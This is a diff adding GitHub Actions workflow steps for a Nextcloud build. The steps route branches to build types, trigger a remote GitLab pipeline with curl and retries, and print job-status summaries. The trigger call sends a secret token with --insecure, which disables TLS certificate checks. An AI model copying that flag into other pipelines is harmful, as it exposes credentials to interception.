+          # Override build type for the stable branches. Matches the suffixed form too, the same
+          # way the upload job's stage-prefix arm does: both jobs now admit the per-major lanes,
+          # and without this arm a suffixed stable lane would deploy as BUILD_TYPE=dev. The dev
+          # lanes need no arm — ionos-dev and ionos-dev-v<N> both fall through to the default.
+          # The ionos-stable-v[0-9]* glob on the right stays unquoted: quoting it would turn
+          # the pattern match into a literal string comparison and every suffixed stable
+          # lane would silently fall through to BUILD_TYPE=dev.
+          if [[ "$REF" == "ionos-stable" || "$REF" == ionos-stable-v[0-9]* ]]; then
+              BUILD_TYPE="stable"
+          # Override build type for rc/* branches
+          elif [[ "$REF" =~ ^rc/ ]]; then
+              BUILD_TYPE="rc"
+          # Extract prefix from */dev/* branches (e.g., 'ah/dev/feature' -> 'dev-ah')
+          elif [[ "$REF" =~ ^.*/dev/.*$ ]]; then
+              # Extract the part before '/dev/'
+              BRANCH_PREFIX=$(printf '%s' "$REF" | sed 's|/.*||' | sed 's/[^A-Za-z0-9._-]/-/g')
+              BUILD_TYPE="dev-${BRANCH_PREFIX}"
+          fi
+
+          # NC major, taken from NC_VERSION ("<major>.<minor>.<patch>.<rev>.<run>") rather than
+          # from the branch name — version.php is authoritative, and the unsuffixed lanes carry
+          # no major in their name at all. The two are already proven to agree: prepare-matrix
+          # asserts it for every lane whose name does encode a major.
+          NC_VERSION="$NC_VERSION_FULL"
+          NC_MAJOR="${NC_VERSION%%.*}"
+          echo "NC_MAJOR: $NC_MAJOR"
+
+          # Construct source build URL for traceability
+          SOURCE_BUILD_URL="https://github.com/${REPO}/actions/runs/${RUN_ID}"
+          echo "Source Build URL: $SOURCE_BUILD_URL"
+
+          # Branch routing is settled; stop tracing before the request so the curl line and
+          # its --form values are not echoed. GitHub masks registered secrets everywhere
+          # including xtrace, so the token was never printed in clear — what this avoids is
+          # dumping the Artifactory path and the shape of the trigger URL. The payload is
+          # echoed explicitly instead, which is what the trace was actually useful for.
+          set +x
+
+          echo "Trigger payload: BUILD_TYPE=$BUILD_TYPE NC_MAJOR=$NC_MAJOR REF=$REF"
+          echo "                 NC_VERSION=$NC_VERSION_FULL BUILD_ID=$RUN_ID"
+
+          # Trigger GitLab pipeline via webhook with retry logic (3 attempts with 30s delay)
+          MAX_ATTEMPTS=3
+          ATTEMPT=1
+          TRIGGER_SUCCESS=false
+          DELAY_SEC=5
+
+          while [ $ATTEMPT -le $MAX_ATTEMPTS ]; do
+            echo "Trigger attempt $ATTEMPT of $MAX_ATTEMPTS..."
+
+            if curl \
+              --silent \
+              --insecure \
+              --request POST \
+              --fail-with-body \
+              -o response.json \
+              --form "token=$GITLAB_TOKEN" \
+              --form ref="main" \
+              --form "variables[GITHUB_SHA]=${GITHUB_SHA_VALUE}" \
+              --form "variables[ARTIFACTORY_LAST_BUILD_PATH]=${ARTIFACTORY_LAST_BUILD_PATH}" \
+              --form "variables[NC_VERSION]=${NC_VERSION_FULL}" \
+              --form "variables[NC_MAJOR]=${NC_MAJOR}" \
+              --form "variables[BUILD_ID]=${RUN_ID}" \
+              --form "variables[BUILD_TYPE]=${BUILD_TYPE}" \
+              --form "variables[GITHUB_REF_NAME]=${REF}" \
+              --form "variables[GITHUB_REPOSITORY]=${REPO}" \
+              --form "variables[SOURCE_BUILD_URL]=${SOURCE_BUILD_URL}" \
+              "$GITLAB_TRIGGER_URL"; then
+              TRIGGER_SUCCESS=true
+              echo "✅ Trigger successful on attempt $ATTEMPT"
+              break
+            else
+              RETCODE="$?"
+              echo "⚠️ Trigger attempt $ATTEMPT failed with code $RETCODE"
+              if [ -f response.json ]; then
+                jq . response.json || cat response.json
+              fi
+              if [ $ATTEMPT -lt $MAX_ATTEMPTS ]; then
+                echo "Waiting ${DELAY_SEC} seconds before retry..."
+                sleep $DELAY_SEC
+                DELAY_SEC=$((DELAY_SEC * 2))  # Exponential backoff: 5s, 10s, 20s
+              fi
+            fi
+
+            ATTEMPT=$((ATTEMPT + 1))
+          done
+
+          if [ "$TRIGGER_SUCCESS" != "true" ]; then
+            echo "❌ Trigger failed after $MAX_ATTEMPTS attempts"
+            if [ -f response.json ]; then
+              jq . response.json || cat response.json
+            fi
+            exit 1
+          fi
+
+          # Print and parse json
+          # jq . response.json
+          echo "json<<END" >> $GITHUB_OUTPUT
+          cat response.json >> $GITHUB_OUTPUT
+          echo "END" >> $GITHUB_OUTPUT
+          echo "web_url<<END" >> $GITHUB_OUTPUT
+          cat response.json | jq --raw-output '.web_url' >> $GITHUB_OUTPUT
+          echo "END" >> $GITHUB_OUTPUT
+
+      - name: Show changes on failure
+        if: failure()
+        run: |
+          git status
+          git --no-pager diff
+          exit 1 # make it red to grab attention
+
+  debug-pipeline-status:
+    runs-on: ubuntu-latest
+    name: Debug Pipeline Status
+    needs: [prepare-matrix, build-external-apps, build-artifact, upload-to-artifactory, nextcloud-workspace-artifact-to-ghcr_io, trigger-remote-dev-workflow]
+    if: always()  # Always run this job regardless of previous job status
+
+    steps:
+      - name: Collect and display pipeline status
+        # REF and TRIGGER_SKIP_REASON in particular carry branch-derived text: the reason
+        # string is built from github.ref_name over in prepare-matrix, so interpolating it
+        # here would re-open the injection this series closes, one job downstream.
+        env:
+          REF: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          EVENT_NAME: ${{ github.event_name }}
+          WORKFLOW_NAME: ${{ github.workflow }}
+          RUN_ID: ${{ github.run_id }}
+          RUN_NUMBER: ${{ github.run_number }}
+          RUN_ATTEMPT: ${{ github.run_attempt }}
+          ACTOR: ${{ github.actor }}
+          TRIGGERING_ACTOR: ${{ github.triggering_actor }}
+          SERVER_URL: ${{ github.server_url }}
+          REPO: ${{ github.repository }}
+          REMOTE_TRIGGER_REASON: ${{ needs.prepare-matrix.outputs.remote_trigger_reason }}
+        run: |
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "🔍 Pipeline Run Status Analysis"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo ""
+
+          # Workflow metadata
+          echo "### 📋 Workflow Metadata"
+          echo "**Workflow:** ${WORKFLOW_NAME}"
+          echo "**Run ID:** ${RUN_ID}"
+          echo "**Run Number:** ${RUN_NUMBER}"
+          echo "**Run Attempt:** ${RUN_ATTEMPT}"
+          echo "**Event:** ${EVENT_NAME}"
+          echo "**Branch/Ref:** ${REF}"
+          echo "**Commit SHA:** ${SHA}"
+          echo "**Actor:** ${ACTOR}"
+          echo "**Triggered by:** ${TRIGGERING_ACTOR}"
+          echo ""
+
+          # Job status summary
+          echo "### 🎯 Job Status Summary"
+          echo ""
+          echo "| Job Name | Status | Conclusion |"
+          echo "|----------|--------|------------|"
+          echo "| prepare-matrix | ${{ needs.prepare-matrix.result }} | - |"
+          echo "| build-external-apps | ${{ needs.build-external-apps.result }} | - |"
+          echo "| build-artifact | ${{ needs.build-artifact.result }} | - |"
+          echo "| upload-to-artifactory | ${{ needs.upload-to-artifactory.result }} | - |"
+          echo "| nextcloud-workspace-artifact-to-ghcr_io | ${{ needs.nextcloud-workspace-artifact-to-ghcr_io.result }} | - |"
+          echo "| trigger-remote-dev-workflow | ${{ needs.trigger-remote-dev-workflow.result }} | - |"
+          echo ""
+
+          # Detailed job analysis
+          echo "### 📊 Detailed Job Analysis"
+          echo ""
+
+          # Function to analyze job result
+          analyze_job() {
+            local job_name=$1
+            local job_result=$2
+
+            case $job_result in
+              "success")
+                echo "✅ **$job_name**: Completed successfully"
+                ;;
+              "failure")
+                echo "❌ **$job_name**: Failed"
+                ;;
+              "cancelled")
+                echo "🚫 **$job_name**: Cancelled"
+                ;;
+              "skipped")
+                echo "⏭️  **$job_name**: Skipped"
+                ;;
+              *)
+                echo "❓ **$job_name**: Unknown status ($job_result)"
+                ;;
+            esac
+          }
+
+          analyze_job "prepare-matrix" "${{ needs.prepare-matrix.result }}"
+          analyze_job "build-external-apps" "${{ needs.build-external-apps.result }}"
+          analyze_job "build-artifact" "${{ needs.build-artifact.result }}"
+          analyze_job "upload-to-artifactory" "${{ needs.upload-to-artifactory.result }}"
+          analyze_job "nextcloud-workspace-artifact-to-ghcr_io" "${{ needs.nextcloud-workspace-artifact-to-ghcr_io.result }}"
+          analyze_job "trigger-remote-dev-workflow" "${{ needs.trigger-remote-dev-workflow.result }}"
+
+          # Explain a skipped remote trigger. Two sources, in precedence order:
+          #   1. a dependency did not succeed — prepare-matrix ran too early to know this
+          #   2. otherwise, the branch/event/variable verdict prepare-matrix published
+          # Falls back to empty (and so to a bare 'skipped', as before) when prepare-matrix itself
+          # did not complete and published no reason.
+          TRIGGER_SKIP_REASON=""
+          if [ "${{ needs.trigger-remote-dev-workflow.result }}" == "skipped" ]; then
+            if [ "${{ needs.build-artifact.result }}" != "success" ]; then
+              TRIGGER_SKIP_REASON="build-artifact did not succeed (${{ needs.build-artifact.result }})"
+            elif [ "${{ needs.upload-to-artifactory.result }}" != "success" ]; then
+              TRIGGER_SKIP_REASON="upload-to-artifactory did not succeed (${{ needs.upload-to-artifactory.result }})"
+            else
+              TRIGGER_SKIP_REASON="$REMOTE_TRIGGER_REASON"
+            fi
+          fi
+
+          if [ -n "$TRIGGER_SKIP_REASON" ]; then
+            echo "   ↳ reason: $TRIGGER_SKIP_REASON"
+          fi
+          echo ""
+
+          # Overall pipeline status
+          echo "### 🎭 Overall Pipeline Status"
+          echo ""
+
+          FAILED_JOBS=""
+          SKIPPED_JOBS=""
+          SUCCESS_JOBS=""
+
+          if [ "${{ needs.prepare-matrix.result }}" == "failure" ]; then FAILED_JOBS="$FAILED_JOBS prepare-matrix"; fi
+          if [ "${{ needs.build-external-apps.result }}" == "failure" ]; then FAILED_JOBS="$FAILED_JOBS build-external-apps"; fi
+          if [ "${{ needs.build-artifact.result }}" == "failure" ]; then FAILED_JOBS="$FAILED_JOBS build-artifact"; fi
+          if [ "${{ needs.upload-to-artifactory.result }}" == "failure" ]; then FAILED_JOBS="$FAILED_JOBS upload-to-artifactory"; fi
+          if [ "${{ needs.nextcloud-workspace-artifact-to-ghcr_io.result }}" == "failure" ]; then FAILED_JOBS="$FAILED_JOBS nextcloud-workspace-artifact-to-ghcr_io"; fi
+          if [ "${{ needs.trigger-remote-dev-workflow.result }}" == "failure" ]; then FAILED_JOBS="$FAILED_JOBS trigger-remote-dev-workflow"; fi
+
+          if [ "${{ needs.build-external-apps.result }}" == "skipped" ]; then SKIPPED_JOBS="$SKIPPED_JOBS build-external-apps"; fi
+          if [ "${{ needs.upload-to-artifactory.result }}" == "skipped" ]; then SKIPPED_JOBS="$SKIPPED_JOBS upload-to-artifactory"; fi
+          if [ "${{ needs.nextcloud-workspace-artifact-to-ghcr_io.result }}" == "skipped" ]; then SKIPPED_JOBS="$SKIPPED_JOBS nextcloud-workspace-artifact-to-ghcr_io"; fi
+          if [ "${{ needs.trigger-remote-dev-workflow.result }}" == "skipped" ]; then SKIPPED_JOBS="$SKIPPED_JOBS trigger-remote-dev-workflow"; fi
+
+          if [ "${{ needs.prepare-matrix.result }}" == "success" ]; then SUCCESS_JOBS="$SUCCESS_JOBS prepare-matrix"; fi
+          if [ "${{ needs.build-external-apps.result }}" == "success" ]; then SUCCESS_JOBS="$SUCCESS_JOBS build-external-apps"; fi
+          if [ "${{ needs.build-artifact.result }}" == "success" ]; then SUCCESS_JOBS="$SUCCESS_JOBS build-artifact"; fi
+          if [ "${{ needs.upload-to-artifactory.result }}" == "success" ]; then SUCCESS_JOBS="$SUCCESS_JOBS upload-to-artifactory"; fi
+          if [ "${{ needs.nextcloud-workspace-artifact-to-ghcr_io.result }}" == "success" ]; then SUCCESS_JOBS="$SUCCESS_JOBS nextcloud-workspace-artifact-to-ghcr_io"; fi
+          if [ "${{ needs.trigger-remote-dev-workflow.result }}" == "success" ]; then SUCCESS_JOBS="$SUCCESS_JOBS trigger-remote-dev-workflow"; fi
+
+          if [ -n "$FAILED_JOBS" ]; then
+            echo "❌ **Pipeline Status:** FAILED"
+            echo ""
+            echo "**Failed Jobs:**"
+            for job in $FAILED_JOBS; do
+              echo "  - $job"
+            done
+          elif [ "${{ needs.prepare-matrix.result }}" == "success" ] && [ "${{ needs.build-artifact.result }}" == "success" ]; then
+            echo "✅ **Pipeline Status:** SUCCESS (core jobs completed)"
+          else
+            echo "⚠️  **Pipeline Status:** PARTIAL (some jobs incomplete)"
+          fi
+
+          if [ -n "$SKIPPED_JOBS" ]; then
+            echo ""
+            echo "**Skipped Jobs:**"
+            for job in $SKIPPED_JOBS; do
+              echo "  - $job"
+            done
+          fi
+
+          if [ -n "$SUCCESS_JOBS" ]; then
+            echo ""
+            echo "**Successful Jobs:**"
+            for job in $SUCCESS_JOBS; do
+              echo "  - $job"
+            done
+          fi
+
+          echo ""
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo ""
+
+          # Add to GitHub step summary
+          {
+            echo "# 🔍 Pipeline Run Status Analysis"
+            echo ""
+            echo "## 📋 Workflow Metadata"
+            echo ""
+            echo "- **Workflow:** ${WORKFLOW_NAME}"
+            echo "- **Run ID:** [\`${RUN_ID}\`](${SERVER_URL}/${REPO}/actions/runs/${RUN_ID})"
+            echo "- **Run Number:** ${RUN_NUMBER}"
+            echo "- **Run Attempt:** ${RUN_ATTEMPT}"
+            echo "- **Event:** ${EVENT_NAME}"
+            echo "- **Branch/Ref:** ${REF}"
+            echo "- **Commit:** [\`${SHA}\`](${SERVER_URL}/${REPO}/commit/${SHA})"
+            echo "- **Actor:** @${ACTOR}"
+            echo "- **Triggered by:** @${TRIGGERING_ACTOR}"
+            echo ""
+            echo "## 🎯 Job Status Summary"
+            echo ""
+            echo "| Job Name | Status |"
+            echo "|----------|--------|"
+            echo "| prepare-matrix | ${{ needs.prepare-matrix.result == 'success' && '✅' || needs.prepare-matrix.result == 'failure' && '❌' || needs.prepare-matrix.result == 'skipped' && '⏭️' || '❓' }} ${{ needs.prepare-matrix.result }} |"
+            echo "| build-external-apps | ${{ needs.build-external-apps.result == 'success' && '✅' || needs.build-external-apps.result == 'failure' && '❌' || needs.build-external-apps.result == 'skipped' && '⏭️' || '❓' }} ${{ needs.build-external-apps.result }} |"
+            echo "| build-artifact | ${{ needs.build-artifact.result == 'success' && '✅' || needs.build-artifact.result == 'failure' && '❌' || needs.build-artifact.result == 'skipped' && '⏭️' || '❓' }} ${{ needs.build-artifact.result }} |"
+            echo "| upload-to-artifactory | ${{ needs.upload-to-artifactory.result == 'success' && '✅' || needs.upload-to-artifactory.result == 'failure' && '❌' || needs.upload-to-artifactory.result == 'skipped' && '⏭️' || '❓' }} ${{ needs.upload-to-artifactory.result }} |"
+            echo "| nextcloud-workspace-artifact-to-ghcr_io | ${{ needs.nextcloud-workspace-artifact-to-ghcr_io.result == 'success' && '✅' || needs.nextcloud-workspace-artifact-to-ghcr_io.result == 'failure' && '❌' || needs.nextcloud-workspace-artifact-to-ghcr_io.result == 'skipped' && '⏭️' || '❓' }} ${{ needs.nextcloud-workspace-artifact-to-ghcr_io.result }} |"
+            echo "| trigger-remote-dev-workflow | ${{ needs.trigger-remote-dev-workflow.result == 'success' && '✅' || needs.trigger-remote-dev-workflow.result == 'failure' && '❌' || needs.trigger-remote-dev-workflow.result == 'skipped' && '⏭️' || '❓' }} ${{ needs.trigger-remote-dev-workflow.result }} |"
+            echo ""
+            if [ -n "$TRIGGER_SKIP_REASON" ]; then
+              echo "> ⏭️ **No remote QA deployment was triggered:** $TRIGGER_SKIP_REASON"
+              echo ">"
+              echo "> Configure at [Settings → Variables → Actions](${SERVER_URL}/${REPO}/settings/variables/actions)."
+              echo ""
+            fi
+
+            if [ -n "$FAILED_JOBS" ]; then
+              echo "## ❌ Pipeline Status: FAILED"
+              echo ""
+              echo "### Failed Jobs"
+              for job in $FAILED_JOBS; do
+                echo "- **$job**"
+              done
+            elif [ "${{ needs.prepare-matrix.result }}" == "success" ] && [ "${{ needs.build-artifact.result }}" == "success" ]; then
+              echo "## ✅ Pipeline Status: SUCCESS"
+              echo ""
+              echo "Core build jobs completed successfully."
+            else
+              echo "## ⚠️ Pipeline Status: PARTIAL"
+              echo ""
+              echo "Some jobs did not complete as expected."
+            fi
+
+            if [ -n "$SKIPPED_JOBS" ]; then
+              echo ""
+              echo "### ⏭️ Skipped Jobs"
+              for job in $SKIPPED_JOBS; do
+                echo "- $job"
+              done
+            fi
+
+          } >> $GITHUB_STEP_SUMMARY
+
+      - name: Environment and context information
+        # workflow_dispatch inputs are dispatcher-supplied free text, and repository
+        # variables are admin-supplied; both reach bash as data via env, not as script.
+        env:
+          FORCE_REBUILD: ${{ github.event.inputs.force_rebuild || 'N/A' }}
+          CACHE_VERSION_SUFFIX: ${{ github.event.inputs.cache_version_suffix || 'N/A' }}
+          APPS_TO_REBUILD: ${{ github.event.inputs.apps_to_rebuild || 'N/A' }}
+          EFFECTIVE_CACHE_VERSION: ${{ needs.prepare-matrix.outputs.effective_cache_version }}
+          RUNNER_OS_NAME: ${{ runner.os }}
+          RUNNER_ARCH_NAME: ${{ runner.arch }}
+          DISABLE_REMOTE_TRIGGER: ${{ vars.DISABLE_REMOTE_TRIGGER || 'not set' }}
+          ENABLE_REMOTE_TRIGGER_USER_DEV: ${{ vars.ENABLE_REMOTE_TRIGGER_USER_DEV || 'not set' }}
+          REMOTE_TRIGGER_NC_VERSION: ${{ vars.REMOTE_TRIGGER_NC_VERSION || 'not set' }}
+          REMOTE_TRIGGER_RC_BRANCH: ${{ vars.REMOTE_TRIGGER_RC_BRANCH || 'not set' }}
+        run: |
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "🌍 Environment & Context Information"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo ""
+          echo "### Workflow Inputs (if workflow_dispatch)"
+          echo "Force Rebuild: ${FORCE_REBUILD}"
+          echo "Cache Version Suffix: ${CACHE_VERSION_SUFFIX}"
+          echo "Apps to Rebuild: ${APPS_TO_REBUILD}"
+          echo ""
+          echo "### Environment Variables"
+          echo "Base CACHE_VERSION: ${CACHE_VERSION}"
+          echo "Effective CACHE_VERSION: ${EFFECTIVE_CACHE_VERSION}"
+          echo "TARGET_PACKAGE_NAME: ${TARGET_PACKAGE_NAME}"
+          echo "ARTIFACTORY_REPOSITORY_SNAPSHOT: ${ARTIFACTORY_REPOSITORY_SNAPSHOT}"
+          echo ""
+          echo "### Runner Information"
+          echo "OS: ${RUNNER_OS_NAME}"
+          echo "Architecture: ${RUNNER_ARCH_NAME}"
+          echo ""
+          echo "### Repository Variables"
+          echo "DISABLE_REMOTE_TRIGGER: ${DISABLE_REMOTE_TRIGGER}"
+          echo "ENABLE_REMOTE_TRIGGER_USER_DEV: ${ENABLE_REMOTE_TRIGGER_USER_DEV}"
+          echo "REMOTE_TRIGGER_NC_VERSION: ${REMOTE_TRIGGER_NC_VERSION}"
+          echo "REMOTE_TRIGGER_RC_BRANCH: ${REMOTE_TRIGGER_RC_BRANCH}"
+          echo ""
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+
+      - name: Job outputs analysis
+        if: always()
+        env:
+          HAS_APPS_TO_BUILD: ${{ needs.prepare-matrix.outputs.has_apps_to_build || 'N/A' }}
+          HAS_APPS_TO_RESTORE: ${{ needs.prepare-matrix.outputs.has_apps_to_restore || 'N/A' }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION || 'N/A' }}
+          ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH || 'N/A' }}
+        run: |
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo "📤 Job Outputs Analysis"
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo ""
+          echo "### prepare-matrix outputs:"
+          echo "- has_apps_to_build: ${HAS_APPS_TO_BUILD}"
+          echo "- has_apps_to_restore: ${HAS_APPS_TO_RESTORE}"
+          echo ""
+          echo "### build-artifact outputs:"
+          echo "- NC_VERSION: ${NC_VERSION_FULL}"
+          echo ""
+          echo "### upload-to-artifactory outputs:"
+          echo "- ARTIFACTORY_LAST_BUILD_PATH: ${ARTIFACTORY_LAST_BUILD_PATH}"
+          echo ""
+          echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+          echo ""
+
+          # Add to step summary
+          {
+            echo ""
+            echo "## 📤 Key Job Outputs"
+            echo ""
+            echo "- **NC_VERSION:** ${NC_VERSION_FULL}"
+            echo "- **Apps to Build:** ${HAS_APPS_TO_BUILD}"
+            echo "- **Apps to Restore:** ${HAS_APPS_TO_RESTORE}"
+            echo "- **Artifactory Path:** ${ARTIFACTORY_LAST_BUILD_PATH}"
+          } >> $GITHUB_STEP_SUMMARY
